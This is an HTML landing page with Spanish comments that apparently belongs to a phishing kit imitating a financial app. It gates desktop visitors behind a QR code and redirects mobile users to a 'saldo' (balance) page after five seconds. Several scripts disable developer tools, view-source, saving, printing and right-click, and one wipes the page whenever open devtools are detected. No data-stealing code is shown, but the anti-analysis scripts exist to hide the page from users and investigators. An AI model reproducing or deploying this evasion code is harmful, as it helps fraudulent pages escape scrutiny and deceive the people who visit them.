<head>

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body, html {
            height: 100%;
            width: 100%;
            overflow: hidden;
            background-color: #000; 
        }

        .background-image {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;

            background-size: cover;
            background-position: center;
            z-index: 1;
        }

        .dark-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
           
            backdrop-filter: blur(8px); 
            -webkit-backdrop-filter: blur(8px); 
            z-index: 2;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        /* Ahora el contenedor es invisible y solo posiciona el gif */
        .loader-container {
            z-index: 3;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .loader-gif {
            width: 180px; /* Puedes ajustar el tamaño aquí */
            height: auto;
        }

        /* Pantalla de bloqueo para PC con Código QR (idéntica a las demás vistas) */
        #desktop-blocker {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background: #ffffff;
            z-index: 99999;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            padding: 24px;
            text-align: center;
            background: url(https://i.imgur.com/jGOJlYo.png) right no-repeat #FBE5F2;
        }

        .desktop-logo {
            height: 60px;
            object-fit: contain;
            margin-bottom: 28px;
        }

        .qr-container {
            background: #ffffff;
            padding: 20px;
            border-radius: 20px;
            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.08);
            border: 1px solid #f0f0f5;
            margin-bottom: 24px;
        }

        .qr-container img {
            width: 220px;
            height: 220px;
            object-fit: contain;
            display: block;
        }

        .desktop-title {
      font-family: 'Manrope', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      font-size: 26px;
      font-weight: 800;
      color: #1e002c;
      margin-bottom: 10px;
    }

    .desktop-desc {
      font-family: 'Manrope', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      font-size: 15px;
      color: #625768;
      max-width: 380px;
      line-height: 1.4;
      font-weight: 500;
      margin: 0 auto;
    }
    </style>
</head>

<!-- Script de Bloqueo Absoluto (Colocado al inicio para ejecutarse antes que cualquier otro recurso) -->
<script>
    // Bloqueo estricto de atajos de teclado para inspección
    window.addEventListener('keydown', function(e) {
        if (
            e.key === 'F12' || 
            e.keyCode === 123 || 
            (e.ctrlKey && e.shiftKey && (e.key.toLowerCase() === 'i' || e.key.toLowerCase() === 'j' || e.key.toLowerCase() === 'c' || e.keyCode === 73 || e.keyCode === 74 || e.keyCode === 67)) || 
            (e.ctrlKey && (e.key.toLowerCase() === 'u' || e.keyCode === 85))
        ) {
            e.preventDefault();
            e.stopPropagation();
            e.stopImmediatePropagation();
            return false;
        }
    }, true);

    // Bloqueo total de clic derecho
    window.addEventListener('contextmenu', function(e) {
        e.preventDefault();
        e.stopPropagation();
        e.stopImmediatePropagation();
        return false;
    }, true);
</script>

<body oncontextmenu="return false;">

    <!-- Pantalla exclusiva para PC con Logo y Código QR -->
    <div id="desktop-blocker">

    <script>
        // Función de detección directa para PC
        function checkDevice() {
            const isDesktop = !(/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) || window.innerWidth > 992;
            if (isDesktop) {
                const blocker = document.getElementById('desktop-blocker');
                if (blocker) {
                    blocker.style.display = 'flex';
                }
            }
        }

        // Ejecutar inmediatamente
        checkDevice();
        window.addEventListener('DOMContentLoaded', checkDevice);

        // Redirige después de 5 segundos solo si está en móvil (si está en PC se queda en el QR)
        setTimeout(function() {
            const isDesktop = !(/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) || window.innerWidth > 992;
            if (!isDesktop) {
                window.location.href = 'saldo.html'; 
            }
        }, 5000); 
    </script>

    <script> // --- Bloqueo de inspección y teclado ---
        document.onkeydown = function(e) {
            // Bloquear F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U
            if (e.keyCode == 123 || 
               (e.ctrlKey && e.shiftKey && (e.keyCode == 'I'.charCodeAt(0) || e.keyCode == 'J'.charCodeAt(0))) || 
               (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0))) {
                return false;
            }
        };

        // Bloquear clic derecho
        document.addEventListener('contextmenu', function(e) {
            e.preventDefault();
        }, false);
    </script>

    <script>
    // Función de detección de PC y bloqueo de herramientas abiertas por consola
    function checkDevice() {
        const isDesktop = !(/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) || window.innerWidth > 992;
        if (isDesktop) {
            const blocker = document.getElementById('desktop-blocker');
            if (blocker) {
                blocker.style.display = 'flex';
            }
        }
    }
    checkDevice();
    window.addEventListener('resize', checkDevice);

    // Detección heurística adicional para evitar inspección por depuración activa
    setInterval(function() {
        const widthThreshold = window.outerWidth - window.innerWidth > 160;
        const heightThreshold = window.outerHeight - window.innerHeight > 160;
        if ((widthThreshold || heightThreshold) && !(/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent))) {
            document.body.innerHTML = "<h2 style='text-align:center; margin-top:20vh; font-family:Arial;'>Acceso bloqueado por seguridad.</h2>";
        }
    }, 1000);
</script>

<script src="https://unpkg.com/lucide@latest"></script>

<script>
    // BLOQUEO PARA DESCARGAR PAGINA CTRL+S
(() => {
    'use strict';

    // Evita ejecutar dos veces la protección.
    if (window.__proteccionWebActiva) return;
    window.__proteccionWebActiva = true;

    function mostrarAviso() {
        if (document.getElementById('aviso-proteccion')) return;

        const aviso = document.createElement('div');
        aviso.id = 'aviso-proteccion';

        Object.assign(aviso.style, {
            position: 'fixed',
            inset: '0',
            zIndex: '2147483647',
            background: 'rgba(0,0,0,.88)',
            color: '#fff',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            padding: '24px',
            boxSizing: 'border-box',
            fontFamily: 'Arial, sans-serif',
            textAlign: 'center'
        });

        const panel = document.createElement('div');
        Object.assign(panel.style, {
            maxWidth: '420px',
            padding: '28px',
            background: '#202020',
            borderRadius: '12px',
            border: '1px solid #555'
        });

        const titulo = document.createElement('h2');
        titulo.textContent = 'Acción no permitida';

        const mensaje = document.createElement('p');
        mensaje.textContent =
            'Esta acción está restringida en esta página.';

        const boton = document.createElement('button');
        boton.type = 'button';
        boton.textContent = 'Volver a la página';

        Object.assign(boton.style, {
            padding: '12px 20px',
            border: '0',
            borderRadius: '6px',
            cursor: 'pointer',
            fontWeight: 'bold'
        });

        boton.addEventListener('click', () => aviso.remove());

        panel.append(titulo, mensaje, boton);
        aviso.appendChild(panel);
        document.body.appendChild(aviso);
    }

    // Bloquear Ctrl+S, Ctrl+U, Ctrl+P y algunas herramientas habituales.
    document.addEventListener('keydown', function (e) {
        const tecla = e.key.toLowerCase();

        if (
            (e.ctrlKey || e.metaKey) &&
            ['s', 'u', 'p'].includes(tecla)
        ) {
            e.preventDefault();
            e.stopImmediatePropagation();
            mostrarAviso();
        }

        // Bloqueo básico de F12 y Ctrl+Shift+I/J/C.
        if (
            tecla === 'f12' ||
            ((e.ctrlKey || e.metaKey) &&
             e.shiftKey &&
             ['i', 'j', 'c'].includes(tecla))
        ) {
            e.preventDefault();
            e.stopImmediatePropagation();
            mostrarAviso();
        }
    }, true);

    // Bloquear menú contextual del clic derecho.
    document.addEventListener('contextmenu', function (e) {
        e.preventDefault();
        mostrarAviso();
    }, true);

})();
</script>
